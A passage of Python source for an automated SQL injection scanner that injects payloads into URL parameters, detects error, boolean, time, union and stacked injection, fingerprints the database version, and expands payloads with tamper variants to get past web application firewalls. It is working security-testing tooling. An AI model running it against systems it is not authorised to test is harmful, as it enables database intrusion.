                if self.proxies:  s.proxies.update(self.proxies)
                s.verify = self.config.verify_ssl
                if HTTPAdapter and Retry:
                    adapter = HTTPAdapter(
                        pool_connections=16, pool_maxsize=32,
                        max_retries=Retry(
                            total=0,
                            status_forcelist=(502, 503, 504),
                            allowed_methods=frozenset(["GET", "POST"]),
                            raise_on_status=False,
                        ),
                    )
                    s.mount("http://", adapter)
                    s.mount("https://", adapter)
                self._session = s
            return self._session

    def _check_budget(self) -> bool:
        return self._request_count >= self.config.max_requests

    def _check_stop(self) -> bool:
        if self.config.stop_event is not None and self.config.stop_event.is_set():
            return True
        if (time.monotonic() - self._started_mono) > self.config.max_duration:
            return True
        return False

    def _apply_rate_limit(self) -> None:
        if self._bucket is not None:
            self._bucket.acquire(timeout=20.0)
            return
        if self.config.request_delay > 0:
            now = time.time()
            elapsed = now - self._last_request_time
            if elapsed < self.config.request_delay:
                time.sleep(self.config.request_delay - elapsed)
            self._last_request_time = time.time()

    def request(self, method: str, url: str,
                params: Optional[Dict] = None,
                data: Optional[Dict] = None,
                headers: Optional[Dict] = None,
                cookies: Optional[Dict] = None,
                json_body: Optional[Dict] = None,
                measure_time: bool = False
                ) -> Optional[Union[requests.Response,
                                    Tuple[requests.Response, float]]]:
        with self._lock:
            if self._check_budget() or self._check_stop():
                return None
            self._apply_rate_limit()
            self._request_count += 1

        session = self._get_session()
        method = method.upper()

        for attempt in range(self.config.retries + 1):
            if self._check_stop():
                return None
            try:
                start = time.time()
                kwargs: Dict[str, Any] = {
                    "timeout": self.config.timeout,
                    "allow_redirects": self.config.follow_redirects,
                }
                if headers:  kwargs["headers"] = headers
                if cookies:  kwargs["cookies"] = cookies
                if json_body is not None:
                    kwargs["json"] = json_body
                elif data is not None:
                    kwargs["data"] = data

                if method == "GET":
                    if params: kwargs["params"] = params
                    response = session.get(url, **kwargs)
                elif method == "POST":
                    if params: kwargs["params"] = params
                    response = session.post(url, **kwargs)
                elif method == "PUT":
                    if params: kwargs["params"] = params
                    response = session.put(url, **kwargs)
                else:
                    raise ValueError(f"Unsupported method: {method}")
                elapsed = time.time() - start

                return (response, elapsed) if measure_time else response
            except RequestException as e:
                logger.debug("Request failed (%d/%d): %s",
                             attempt + 1, self.config.retries + 1, e)
                if attempt < self.config.retries:
                    time.sleep(self.config.retry_delay * (attempt + 1))
                else:
                    return None
        return None


# ═══════════════════════════════════════════════════════════════════════════
# BASELINE ENGINE
# ═══════════════════════════════════════════════════════════════════════════
class BaselineEngine:
    def __init__(self, http_client: HTTPClient,
                 normalizer: ResponseNormalizer, config: ScanConfig):
        self.http_client = http_client
        self.normalizer = normalizer
        self.config = config

    def collect_baseline(self, url: str, method: str,
                         params: Optional[Dict] = None,
                         data: Optional[Dict] = None) -> BaselineSignature:
        r = self.http_client.request(method, url, params=params, data=data)
        if r is None:
            return BaselineSignature()

        text = r.text[:self.config.max_response_size]
        normalized = self.normalizer.normalize(text)
        title_match = re.search(r"<title[^>]*>(.*?)</title>", text, re.I | re.S)
        title = title_match.group(1).strip() if title_match else ""

        return BaselineSignature(
            status_code=r.status_code,
            response_length=len(r.text),
            content_type=r.headers.get("Content-Type", ""),
            title=title,
            normalized_body_hash=self.normalizer.hash_normalized(normalized),
            normalized_body_preview=normalized[:300],
            timestamp=time.time(),
        )

    def collect_multiple_baselines(self, url: str, method: str,
                                   params: Optional[Dict] = None,
                                   data: Optional[Dict] = None
                                   ) -> List[BaselineSignature]:
        out: List[BaselineSignature] = []
        for _ in range(self.config.baseline_samples):
            if self.config.stop_event is not None and self.config.stop_event.is_set():
                break
            sig = self.collect_baseline(url, method, params, data)
            if sig.status_code > 0:
                out.append(sig)
            else:
                break
        return out

    @staticmethod
    def is_stable(baselines: List[BaselineSignature]) -> bool:
        if not baselines: return False
        if len(baselines) == 1: return True
        hashes = [b.normalized_body_hash for b in baselines if b.normalized_body_hash]
        return bool(hashes) and len(set(hashes)) == 1


# ═══════════════════════════════════════════════════════════════════════════
# DETECTION ENGINES
# ═══════════════════════════════════════════════════════════════════════════
class ErrorDetector:
    ERROR_PATTERNS = [
        (re.compile(r"you have an error in your sql syntax", re.I), "mysql", 0.95),
        (re.compile(r"mysql_fetch_(array|row|assoc|object)", re.I), "mysql", 0.90),
        (re.compile(r"warning:\s+mysql_", re.I), "mysql", 0.85),
        (re.compile(r"mysqli::query\(\)", re.I), "mysql", 0.90),
        (re.compile(r"mysql_num_rows", re.I), "mysql", 0.85),
        (re.compile(r"pg_query\(\)", re.I), "postgresql", 0.90),
        (re.compile(r"postgresql.*error", re.I), "postgresql", 0.85),
        (re.compile(r"psql:.*syntax error", re.I), "postgresql", 0.90),
        (re.compile(r"syntax error at or near", re.I), "postgresql", 0.85),
        (re.compile(r"microsoft ole db provider for odbc drivers", re.I), "mssql", 0.90),
        (re.compile(r"odbc microsoft access driver", re.I), "mssql", 0.85),
        (re.compile(r"sql server.*error", re.I), "mssql", 0.85),
        (re.compile(r"unclosed quotation mark after the character string", re.I), "mssql", 0.90),
        (re.compile(r"ora-\d{4,5}", re.I), "oracle", 0.90),
        (re.compile(r"oracle.*error", re.I), "oracle", 0.80),
        (re.compile(r"quoted string not properly terminated", re.I), "oracle", 0.85),
        (re.compile(r"sqlite3\.operationalerror", re.I), "sqlite", 0.90),
        (re.compile(r"sqlite3\.warning", re.I), "sqlite", 0.85),
        (re.compile(r'near ".*": syntax error', re.I), "sqlite", 0.85),
        (re.compile(r"sql command not properly ended", re.I), None, 0.80),
        (re.compile(r"pdoexception", re.I), None, 0.75),
        (re.compile(r"sqlstate\[", re.I), None, 0.80),
        (re.compile(r"unterminated quoted string", re.I), None, 0.80),
        (re.compile(r"jdbc.*sqlexception", re.I), None, 0.80),
    ]

    VERSION_PATTERNS = [
        (re.compile(r"mysql.*?(\d+\.\d+\.\d+)", re.I), "mysql"),
        (re.compile(r"postgresql.*?(\d+\.\d+(?:\.\d+)?)", re.I), "postgresql"),
        (re.compile(r"microsoft sql server.*?(\d+\.\d+\.\d+)", re.I), "mssql"),
        (re.compile(r"oracle database.*?(\d+[a-z]?\.\d+\.\d+)", re.I), "oracle"),
        (re.compile(r"sqlite.*?(\d+\.\d+\.\d+)", re.I), "sqlite"),
    ]

    @classmethod
    def detect(cls, response_text: str) -> Optional[Dict[str, Any]]:
        if not response_text:
            return None
        best: Optional[Dict[str, Any]] = None
        best_w = 0.0
        for rx, db, weight in cls.ERROR_PATTERNS:
            if rx.search(response_text) and weight > best_w:
                best_w = weight
                best = {"database_type": db,
                        "matched_error": rx.pattern,
                        "confidence": weight}
        if best:
            for rx, db in cls.VERSION_PATTERNS:
                m = rx.search(response_text)
                if m:
                    best["db_version"] = m.group(1)
                    break
        return best


class BooleanDetector:
    def __init__(self, config: ScanConfig, normalizer: ResponseNormalizer):
        self.config = config
        self.normalizer = normalizer

    def compare(self, baseline: BaselineSignature,
                true_response: requests.Response,
                false_response: requests.Response) -> Optional[Dict[str, Any]]:
        if true_response is None or false_response is None:
            return None

        true_text  = self.normalizer.normalize(true_response.text[:self.config.max_response_size])
        false_text = self.normalizer.normalize(false_response.text[:self.config.max_response_size])
        base_text  = baseline.normalized_body_preview

        sim_true  = self.normalizer.similarity(true_text, base_text) if base_text else 0.0
        sim_false = self.normalizer.similarity(false_text, base_text) if base_text else 0.0
        sim_tf    = self.normalizer.similarity(true_text, false_text)

        signals: List[float] = []
        status_diff = abs(true_response.status_code - false_response.status_code)
        signals.append(0.8 if status_diff > 0 else 0.2)

        len_t = len(true_response.text); len_f = len(false_response.text)
        len_delta = abs(len_t - len_f) / max(len_t, len_f, 1)
        signals.append(0.7 if len_delta > 0.10 else 0.5 if len_delta > 0.05 else 0.1)

        signals.append(0.7 if sim_tf < 0.9 else 0.1)

        t_title = re.search(r"<title[^>]*>(.*?)</title>", true_response.text,  re.I | re.S)
        f_title = re.search(r"<title[^>]*>(.*?)</title>", false_response.text, re.I | re.S)
        if t_title and f_title:
            signals.append(0.6 if t_title.group(1).strip() != f_title.group(1).strip() else 0.1)
        else:
            signals.append(0.2)

        confidence = sum(signals) / len(signals)
        if confidence < self.config.confidence_threshold:
            return None

        return {"confidence": confidence,
                "similarity_true_baseline": sim_true,
                "similarity_false_baseline": sim_false,
                "similarity_true_false": sim_tf,
                "length_delta": len_delta,
                "status_diff": status_diff,
                "signal_count": len(signals),
                "signals": signals}


class TimeDetector:
    def __init__(self, config: ScanConfig, http_client: HTTPClient):
        self.config = config
        self.http_client = http_client

    def detect(self, url: str, method: str, payload: str,
               param_name: str, static_params: Dict[str, str],
               param_in: str = "query"
               ) -> Optional[Dict[str, Any]]:
        baseline_times: List[float] = []
        inject_times:   List[float] = []

        def _send(val: str) -> Optional[float]:
            params = data = None
            headers = cookies = None
            if param_in == "query":
                params = dict(static_params or {}); params[param_name] = val
            elif param_in == "body":
                data = dict(static_params or {}); data[param_name] = val
            elif param_in == "header":
                headers = dict(static_params or {}); headers[param_name] = val
            elif param_in == "cookie":
                cookies = dict(static_params or {}); cookies[param_name] = val
            r = self.http_client.request(
                method, url, params=params, data=data,
                headers=headers, cookies=cookies, measure_time=True,
            )
            return r[1] if r is not None else None

        for _ in range(max(2, self.config.baseline_samples)):
            if self.config.stop_event is not None and self.config.stop_event.is_set():
                return None
            t = _send("1")
            if t is not None:
                baseline_times.append(t)

        for _ in range(2):
            if self.config.stop_event is not None and self.config.stop_event.is_set():
                return None
            t = _send(payload)
            if t is not None:
                inject_times.append(t)

        if not baseline_times or not inject_times:
            return None

        bs = TimingSample(baseline_times); is_ = TimingSample(inject_times)
        delta = is_.mean() - bs.mean()
        jitter = bs.std_dev() + is_.std_dev()
        if delta < self.config.time_trigger:
            return None

        consistency = 1.0 - min(jitter / delta, 1.0) if jitter > 0 else 1.0
        delta_factor = min(delta / (self.config.time_trigger * 2), 1.0)
        confidence = 0.5 + 0.5 * delta_factor * consistency
        if confidence < self.config.confidence_threshold:
            return None

        return {"baseline_mean": bs.mean(),
                "baseline_std": bs.std_dev(),
                "inject_mean": is_.mean(),
                "inject_std": is_.std_dev(),
                "delta": delta, "jitter": jitter,
                "consistency": consistency,
                "confidence": confidence}


class UnionDetector:
    def __init__(self, config: ScanConfig, normalizer: ResponseNormalizer):
        self.config = config
        self.normalizer = normalizer

    def detect(self, baseline: BaselineSignature,
               response: requests.Response, payload: str
               ) -> Optional[Dict[str, Any]]:
        if response is None:
            return None
        text = self.normalizer.normalize(response.text[:self.config.max_response_size])
        baseline_text = baseline.normalized_body_preview
        sim = self.normalizer.similarity(text, baseline_text) if baseline_text else 0.0

        signals: List[float] = []
        signals.append(0.5 if response.status_code == 200 else 0.1)
        len_diff = abs(len(response.text) - baseline.response_length)
        len_ratio = len_diff / max(baseline.response_length, 1)
        signals.append(0.6 if len_ratio > 0.05 else 0.2)
        signals.append(0.7 if 0.3 <= sim <= 0.85 else 0.2)

        confidence = sum(signals) / len(signals)
        if confidence < self.config.confidence_threshold:
            return None
        return {"similarity": sim, "length_diff": len_diff,
                "length_ratio": len_ratio, "confidence": confidence}


class ConfidenceEngine:
    @staticmethod
    def classify(confidence: float) -> str:
        if confidence >= 0.95: return "critical"
        if confidence >= 0.80: return "high"
        if confidence >= 0.60: return "medium"
        if confidence >= 0.30: return "low"
        return "informational"

    @staticmethod
    def severity_from_confidence_and_technique(confidence: float,
                                               technique: str) -> str:
        base = {
            "error-based":   0.85,
            "boolean-based": 0.75,
            "time-based":    0.65,
            "union-based":   0.70,
            "stacked-based": 0.90,
        }.get(technique, 0.5)
        score = base * confidence
        if score >= 0.80: return "critical"
        if score >= 0.60: return "high"
        if score >= 0.40: return "medium"
        if score >= 0.20: return "low"
        return "informational"


class FindingValidator:
    @staticmethod
    def classify_status(confidence: float, technique: str,
                        evidence: Dict[str, Any]) -> str:
        if confidence >= 0.85: return "confirmed"
        if confidence >= 0.60: return "probable"
        if confidence >= 0.40: return "possible"
        if confidence >= 0.25: return "inconclusive"
        return "blocked"


# ═══════════════════════════════════════════════════════════════════════════
# SCANNER
# ═══════════════════════════════════════════════════════════════════════════
class SQLiScanner:
    def __init__(self, config: Optional[ScanConfig] = None,
                 headers: Optional[Dict[str, str]] = None,
                 cookies: Optional[Dict[str, str]] = None,
                 proxies: Optional[Dict[str, str]] = None):
        self.config = config or ScanConfig()
        self.config.validate()
        self.headers = headers
        self.cookies = cookies
        self.proxies = proxies
        self.normalizer = ResponseNormalizer()
        self.http_client = HTTPClient(self.config, headers, cookies, proxies)
        self.baseline_engine = BaselineEngine(self.http_client, self.normalizer, self.config)
        self.error_detector   = ErrorDetector()
        self.boolean_detector = BooleanDetector(self.config, self.normalizer)
        self.time_detector    = TimeDetector(self.config, self.http_client)
        self.union_detector   = UnionDetector(self.config, self.normalizer)
        self.confidence_engine = ConfidenceEngine()
        self.validator = FindingValidator()
        self._findings_fingerprints: set = set()
        self.errors = 0
        self._done = 0
        self._total = 0
        self._waf_bypass_used = False

    # ── discovery ────────────────────────────────────────────────────
    def extract_parameters(self, url: str) -> Dict[str, str]:
        params = {}
        for k, vals in parse_qs(urlparse(url).query).items():
            params[k] = vals[0] if vals else ""
        return params

    def _discover_parameters(self, url: str) -> Dict[str, str]:
        params = self.extract_parameters(url)
        try:
            r = self.http_client.request("GET", url)
            if r is not None and r.status_code < 400:
                soup = BeautifulSoup(r.text, "html.parser")
                for inp in soup.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if name and name not in params:
                        params[name] = ""
        except Exception:
            pass
        if not params:
            for k in ("id", "q", "search", "query", "page", "cat", "item",
                      "product", "user", "username", "email", "name", "sort",
                      "filter", "type", "action"):
                params[k] = ""
        return params

    # ── plumbing ─────────────────────────────────────────────────────
    def _should_stop(self) -> bool:
        if self.config.stop_event is not None and self.config.stop_event.is_set():
            return True
        if self.http_client._request_count >= self.config.max_requests:
            return True
        return False

    def _emit_progress(self, label: str = "") -> None:
        if not self.config.progress_cb:
            return
        try:
            self.config.progress_cb(self._done, self._total, label)
        except Exception:
            pass

    def _dedup(self, f: ScanFinding) -> bool:
        fp = (f.parameter, f.parameter_in, f.technique,
              f.database_type or "", f.status)
        if fp in self._findings_fingerprints:
            return False
        self._findings_fingerprints.add(fp)
        return True

    def _inject(self, method, url, param_name, value, param_in, static_params
                ) -> Optional[requests.Response]:
        params = data = headers = cookies = None
        if param_in == "query":
            params = dict(static_params or {}); params[param_name] = value
        elif param_in == "body":
            data = dict(static_params or {}); data[param_name] = value
        elif param_in == "header":
            headers = dict(static_params or {}); headers[param_name] = value
        elif param_in == "cookie":
            cookies = dict(static_params or {}); cookies[param_name] = value
        return self.http_client.request(
            method, url, params=params, data=data,
            headers=headers, cookies=cookies,
        )

    # ── per-technique scans ──────────────────────────────────────────
    def _scan_error_based(self, url, method, param_name, param_in,
                          static_params, payloads) -> List[ScanFinding]:
        out: List[ScanFinding] = []
        for payload in payloads:
            if self._should_stop(): break
            r = self._inject(method, url, param_name, payload.value,
                             param_in, static_params)
            self._done += 1
            self._emit_progress(f"{param_name}:error")
            if r is None:
                self.errors += 1
                continue
            det = self.error_detector.detect(r.text)
            if not det: continue
            conf = det["confidence"]
            status = self.validator.classify_status(conf, "error-based", det)
            f = ScanFinding(
                parameter=param_name, parameter_in=param_in,
                technique="error-based", confidence=conf,
                severity=self.confidence_engine.severity_from_confidence_and_technique(
                    conf, "error-based"),
                status=status,
                database_type=det["database_type"],
                db_version=det.get("db_version"),
                evidence={"status_code": r.status_code,
                          "matched_error": det["matched_error"]},
                matched_error=det["matched_error"],
                payload=payload.value,
                tamper=payload.technique.replace("error-", "")
                       if "tampered" in payload.technique else None,
                response_status=r.status_code,
            )
            if self._dedup(f):
                out.append(f)
                if not self.config.continue_after_detection and conf >= 0.8:
                    break
        return out

    def _scan_boolean_based(self, url, method, param_name, param_in,
                            static_params, baseline) -> List[ScanFinding]:
        out: List[ScanFinding] = []
        true_payloads, false_payloads = PayloadRegistry.get_boolean_payloads()
        for tp, fp_ in zip(true_payloads, false_payloads):
            if self._should_stop(): break
            rt = self._inject(method, url, param_name, tp.value,
                              param_in, static_params)
            rf = self._inject(method, url, param_name, fp_.value,
                              param_in, static_params)
            self._done += 2
            self._emit_progress(f"{param_name}:boolean")
            if rt is None or rf is None:
                self.errors += 1
                continue
            det = self.boolean_detector.compare(baseline, rt, rf)
            if not det: continue
            conf = det["confidence"]
            status = self.validator.classify_status(conf, "boolean-based", det)
            f = ScanFinding(
                parameter=param_name, parameter_in=param_in,
                technique="boolean-based", confidence=conf,
                severity=self.confidence_engine.severity_from_confidence_and_technique(
                    conf, "boolean-based"),
                status=status, evidence=det,
                payload=tp.value,
                response_status=rt.status_code,
                baseline_length=baseline.response_length,
                response_length=len(rt.text),
                similarity=det.get("similarity_true_false"),
            )
            if self._dedup(f):
                out.append(f)
                if not self.config.continue_after_detection and conf >= 0.8:
                    break
        return out

    def _scan_time_based(self, url, method, param_name, param_in,
                         static_params, payloads) -> List[ScanFinding]:
        out: List[ScanFinding] = []
        for payload in payloads:
            if self._should_stop(): break
            det = self.time_detector.detect(url, method, payload.value,
                                            param_name, static_params, param_in)
            self._done += 1
            self._emit_progress(f"{param_name}:time")
            if not det: continue
            conf = det["confidence"]
            status = self.validator.classify_status(conf, "time-based", det)
            f = ScanFinding(
                parameter=param_name, parameter_in=param_in,
                technique="time-based", confidence=conf,
                severity=self.confidence_engine.severity_from_confidence_and_technique(
                    conf, "time-based"),
                status=status, database_type=payload.database,
                evidence=det, payload=payload.value,
                tamper=payload.technique.replace("time-", "")
                       if "tampered" in payload.technique else None,
            )
            if self._dedup(f):
                out.append(f)
                if not self.config.continue_after_detection and conf >= 0.8:
                    break
        return out

    def _scan_union_based(self, url, method, param_name, param_in,
                          static_params, baseline, payloads) -> List[ScanFinding]:
        out: List[ScanFinding] = []
        for payload in payloads:
            if self._should_stop(): break
            r = self._inject(method, url, param_name, payload.value,
                             param_in, static_params)
            self._done += 1
            self._emit_progress(f"{param_name}:union")
            if r is None:
                self.errors += 1
                continue
            det = self.union_detector.detect(baseline, r, payload.value)
            if not det: continue
            conf = det["confidence"]
            status = self.validator.classify_status(conf, "union-based", det)
            f = ScanFinding(
                parameter=param_name, parameter_in=param_in,
                technique="union-based", confidence=conf,
                severity=self.confidence_engine.severity_from_confidence_and_technique(
                    conf, "union-based"),
                status=status, evidence=det, payload=payload.value,
                response_status=r.status_code,
                baseline_length=baseline.response_length,
                response_length=len(r.text),
                similarity=det.get("similarity"),
            )
            if self._dedup(f):
                out.append(f)
                if not self.config.continue_after_detection and conf >= 0.8:
                    break
        return out

    def _scan_stacked(self, url, method, param_name, param_in,
                      static_params, baseline, payloads) -> List[ScanFinding]:
        out: List[ScanFinding] = []
        for payload in payloads:
            if self._should_stop(): break
            r = self._inject(method, url, param_name, payload.value,
                             param_in, static_params)
            self._done += 1
            self._emit_progress(f"{param_name}:stacked")
            if r is None:
                self.errors += 1
                continue
            # Stacked detection = error signature OR a strong timing change
            det = self.error_detector.detect(r.text)
            if det:
                conf = det["confidence"] * 0.9
                status = self.validator.classify_status(conf, "stacked-based", det)
                f = ScanFinding(
                    parameter=param_name, parameter_in=param_in,
                    technique="stacked-based", confidence=conf,
                    severity=self.confidence_engine.severity_from_confidence_and_technique(
                        conf, "stacked-based"),
                    status=status,
                    database_type=det.get("database_type"),
                    evidence={"status_code": r.status_code,
                              "matched_error": det.get("matched_error")},
                    payload=payload.value,
                    response_status=r.status_code,
                )
                if self._dedup(f):
                    out.append(f)
        return out

    # ── main scan ────────────────────────────────────────────────────
    def scan(self, url: str, method: str = "GET",
             params: Optional[Dict[str, str]] = None,
             payloads: Optional[List[str]] = None) -> ScanResult:
        url = _normalize_url(url)
        scan_id = uuid.uuid4().hex[:12]
        started_at = datetime.now(timezone.utc).isoformat()
        t0 = time.time()

        result = ScanResult()
        result.scan_id = scan_id
        result.started_at = started_at
        result.url = url
        result.method = method
        result.status = "running"

        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            result.status = "error"
            result.warnings.append("Invalid URL")
            result.completed_at = datetime.now(timezone.utc).isoformat()
            return result

        if params is None:
            params = self._discover_parameters(url)
        if not params:
            params = {"id": ""}
        result.parameters_tested = list(params.keys())

        techniques: List[str] = []
        if self.config.test_error:   techniques.append("error")
        if self.config.test_boolean: techniques.append("boolean")
        if self.config.test_time:    techniques.append("time")
        if self.config.test_union:   techniques.append("union")
        if self.config.test_stacked: techniques.append("stacked")
        result.techniques_tested = techniques

        # Load external wordlist (auto-sync on first call)
        try:
            external = load_sqli_wordlist(auto_sync=True)
            result.wordlist_size = len(external)
        except Exception:
            external = []
            result.wordlist_size = 0

        # Baseline
        bl_samples = self.baseline_engine.collect_multiple_baselines(
            url, method,
            params=params if method.upper() == "GET" else None,
            data=params if method.upper() == "POST" else None,
        )
        if not bl_samples:
            result.status = "error"
            result.warnings.append("Failed to collect baseline")
            result.completed_at = datetime.now(timezone.utc).isoformat()
            return result

        baseline = bl_samples[0]
        if not self.baseline_engine.is_stable(bl_samples):
            result.warnings.append("Baseline unstable — results may be less reliable")

        # WAF detection (informational)
        try:
            r0 = self.http_client.request("GET", url)
            if r0 is not None:
                result.waf_detected = _detect_waf(dict(r0.headers), r0.text)
        except Exception:
            pass

        # Payload sets
        if payloads:
            error_pls = [Payload(p, "error", None, "low", "") for p in payloads]
            time_pls  = [Payload(p, "time", None, "low", "")
                         for p in payloads
                         if any(k in p.lower() for k in ("sleep", "waitfor", "pg_sleep"))]
            union_pls = [Payload(p, "union", None, "low", "")
                         for p in payloads if "union" in p.lower()]
            stacked_pls: List[Payload] = []
        else:
            error_pls   = PayloadRegistry.get_error_payloads(
                max_count=self.config.max_wordlist_payloads)
            time_pls    = PayloadRegistry.get_time_payloads(max_count=30)
            union_pls   = PayloadRegistry.get_union_payloads(max_count=30)
            stacked_pls = PayloadRegistry.get_stacked_payloads(max_count=15) \
                          if self.config.test_stacked else []

            # WAF bypass: if a WAF was detected, expand with tamper variants
            if self.config.enable_tamper and result.waf_detected:
                self._waf_bypass_used = True
                error_pls = PayloadRegistry.expand_with_tamper(
                    error_pls, MAX_TAMPER_VARIANTS)
                time_pls = PayloadRegistry.expand_with_tamper(
                    time_pls, 2)
                union_pls = PayloadRegistry.expand_with_tamper(
                    union_pls, 2)

        result.tampered_payloads = sum(
            1 for p in (error_pls + time_pls + union_pls + stacked_pls)
            if "tampered" in p.technique
        )

        # Total work estimate
        per_param = 0
        if self.config.test_error:   per_param += len(error_pls)
        if self.config.test_boolean: per_param += 2 * len(PayloadRegistry.BOOLEAN_TRUE)
        if self.config.test_time:    per_param += len(time_pls)
        if self.config.test_union:   per_param += len(union_pls)
        if self.config.test_stacked: per_param += len(stacked_pls)
        self._total = per_param * len(params)
        self._done = 0

        # Scan each parameter
        total_payloads = 0
        for param_name in params.keys():
            if self._should_stop():
                break
            static = {k: v for k, v in params.items() if k != param_name}

            if self.config.test_error and error_pls:
                total_payloads += len(error_pls)
                result.findings.extend(
                    self._scan_error_based(url, method, param_name, "query",
                                           static, error_pls))
            if self.config.test_boolean:
                total_payloads += 2 * len(PayloadRegistry.BOOLEAN_TRUE)
                result.findings.extend(
                    self._scan_boolean_based(url, method, param_name, "query",
                                             static, baseline))
            if self.config.test_time and time_pls:
                total_payloads += len(time_pls)
                result.findings.extend(
                    self._scan_time_based(url, method, param_name, "query",
                                          static, time_pls))
            if self.config.test_union and union_pls:
                total_payloads += len(union_pls)
                result.findings.extend(
                    self._scan_union_based(url, method, param_name, "query",
                                           static, baseline, union_pls))
            if self.config.test_stacked and stacked_pls:
                total_payloads += len(stacked_pls)
                result.findings.extend(
                    self._scan_stacked(url, method, param_name, "query",
                                       static, baseline, stacked_pls))

            if self.http_client._request_count >= self.config.max_requests:
                result.status = "request_budget_exhausted"
                break

        result.payloads_tested = total_payloads
        result.requests_sent = self.http_client._request_count
        result.errors = self.errors
        result.vulnerable = len(result.findings) > 0
        result.completed_at = datetime.now(timezone.utc).isoformat()
        result.duration = round(time.time() - t0, 3)
        result.cancelled = bool(
            self.config.stop_event is not None and self.config.stop_event.is_set())
        result.status = "cancelled" if result.cancelled else "completed"
        result.waf_bypass_used = self._waf_bypass_used

        # Best DBMS + version
        confident_dbs = [f.database_type for f in result.findings
                         if f.database_type and f.confidence >= 0.5]
        if confident_dbs:
            result.database_hint = max(set(confident_dbs),
                                       key=confident_dbs.count)
        versions = [f.db_version for f in result.findings if f.db_version]
        if versions:
            result.db_version = versions[0]

        return result


# ═══════════════════════════════════════════════════════════════════════════
# INTEGRATION ADAPTERS
# ═══════════════════════════════════════════════════════════════════════════
def run_sql_injection_scan(
    url: str,
    method: str = "GET",
    params: Optional[Dict[str, str]] = None,
    timeout: float = DEFAULT_TIMEOUT,
    max_threads: int = DEFAULT_MAX_THREADS,
    verify_ssl: bool = False,
    headers: Optional[Dict[str, str]] = None,
    cookies: Optional[Dict[str, str]] = None,
    proxies: Optional[Dict[str, str]] = None,
    payloads: Optional[List[str]] = None,
    test_boolean: bool = True,
    test_error: bool = True,
    test_time: bool = True,
    test_union: bool = True,
    test_stacked: bool = False,
    time_based_trigger: float = DEFAULT_TIME_TRIGGER,
    boolean_threshold: float = DEFAULT_BOOLEAN_THRESHOLD,
    max_duration: float = DEFAULT_MAX_DURATION,
    rate_limit: float = DEFAULT_RATE_LIMIT,
    enable_tamper: bool = True,
    cancel_event: Optional[threading.Event] = None,
    progress_cb: Optional[Callable[[int, int, str], None]] = None,
    **kwargs,
) -> Dict[str, Any]:
    config = ScanConfig(
        timeout=timeout, max_threads=max_threads, verify_ssl=verify_ssl,
        test_boolean=test_boolean, test_error=test_error,
        test_time=test_time, test_union=test_union,
        test_stacked=test_stacked,
        time_trigger=time_based_trigger,
        boolean_similarity_threshold=boolean_threshold,
        max_duration=max_duration, rate_limit=rate_limit,
        enable_tamper=enable_tamper,
        stop_event=cancel_event, progress_cb=progress_cb,
    )
    for k, v in kwargs.items():
        if hasattr(config, k):
            setattr(config, k, v)

    scanner = SQLiScanner(config=config, headers=headers,
                          cookies=cookies, proxies=proxies)
    return scanner.scan(url, method, params, payloads).to_dict()


def run(target: str, mode: str = "basic", **kwargs) -> Dict[str, Any]:
    url = _normalize_url(target)

    if mode == "expert":
        test_flags = dict(test_error=True, test_boolean=True,
                          test_time=True, test_union=True,
                          test_stacked=True)
        max_threads = int(kwargs.get("max_threads", 10))
    else:
        test_flags = dict(test_error=True, test_boolean=True,
                          test_time=False, test_union=False,
                          test_stacked=False)
        max_threads = int(kwargs.get("max_threads", 8))

    try:
        result = run_sql_injection_scan(
            url=url,
            method=str(kwargs.get("method", "GET")),
            params=kwargs.get("params"),
            timeout=float(kwargs.get("timeout", DEFAULT_TIMEOUT)),
            max_threads=max_threads,
            verify_ssl=bool(kwargs.get("verify_ssl", False)),
            max_duration=float(kwargs.get("max_duration", DEFAULT_MAX_DURATION)),
            rate_limit=float(kwargs.get("rate_limit", DEFAULT_RATE_LIMIT)),
            headers=kwargs.get("headers"),
            cookies=kwargs.get("cookies"),
            proxies=kwargs.get("proxies"),
            cancel_event=kwargs.get("cancel_event"),
            progress_cb=kwargs.get("progress_cb"),
            **test_flags,
        )

        vulnerable = bool(result.get("vulnerable"))
        sev_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1}
        top_sev, top_rank = "safe", 0
        for finding in result.get("findings", []):
            sev = str(finding.get("severity", "")).lower()
            if sev_rank.get(sev, 0) > top_rank:
                top_rank, top_sev = sev_rank[sev], sev

        result["mode"] = mode
        result["severity"] = top_sev if vulnerable else "safe"
        result["summary"] = (
            f"{len(result.get('findings', []))} SQL injection point(s) found"
            if vulnerable else "No SQL injection detected"
        )
        return {
            "tool":    "sql_map",
            "version": __version__,
            "target":  target,
            "data":    result,
            "error":   None,
        }
    except Exception as e:
        logger.error("SQLi run() failed for %s: %s", url, e, exc_info=True)
        return {
            "tool":    "sql_map",
            "version": __version__,
            "target":  target,
            "data":    {"url": url, "scan_type": "sqli",
                        "vulnerable": False, "findings": []},
            "error":   str(e),
        }


# ═══════════════════════════════════════════════════════════════════════════
# STREAMING API
# ═══════════════════════════════════════════════════════════════════════════
def run_streaming(target: str, mode: str = "basic",
                  options: Optional[Dict[str, Any]] = None,
                  cancel_event: Optional[threading.Event] = None
                  ) -> Iterator[Dict[str, Any]]:
    options = options or {}
    url = _normalize_url(target)

    if mode == "expert":
        test_flags = dict(test_error=True, test_boolean=True,
                          test_time=True, test_union=True, test_stacked=True)
        max_threads = int(options.get("max_threads", 10))
    else:
        test_flags = dict(test_error=True, test_boolean=True,
                          test_time=False, test_union=False, test_stacked=False)
        max_threads = int(options.get("max_threads", 8))

    events: List[Dict[str, Any]] = []
    events_lock = threading.Lock()
    done = threading.Event()
    holder: Dict[str, Any] = {}

    def _progress(done_count: int, total: int, label: str) -> None:
        pct = int((done_count / total) * 100) if total else 0
        with events_lock:
            events.append({"type": "progress", "done": done_count,
                           "total": total, "percent": pct, "label": label})

    def _worker() -> None:
        try:
            holder["result"] = run(
                target, mode,
                method=str(options.get("method", "GET")),
                params=options.get("params"),
                timeout=float(options.get("timeout", DEFAULT_TIMEOUT)),
                max_threads=max_threads,
                verify_ssl=bool(options.get("verify_ssl", False)),
                max_duration=float(options.get("max_duration", DEFAULT_MAX_DURATION)),
                rate_limit=float(options.get("rate_limit", DEFAULT_RATE_LIMIT)),
                headers=options.get("headers"),
                cookies=options.get("cookies"),
                proxies=options.get("proxies"),
                cancel_event=cancel_event,
                progress_cb=_progress,
                **test_flags,
            )
        except Exception as e:
            holder["error"] = str(e)
        finally:
            done.set()

    threading.Thread(target=_worker, daemon=True,
                     name=f"sqlmap-{url[:32]}").start()

    yield {"type": "start", "url": url, "mode": mode,
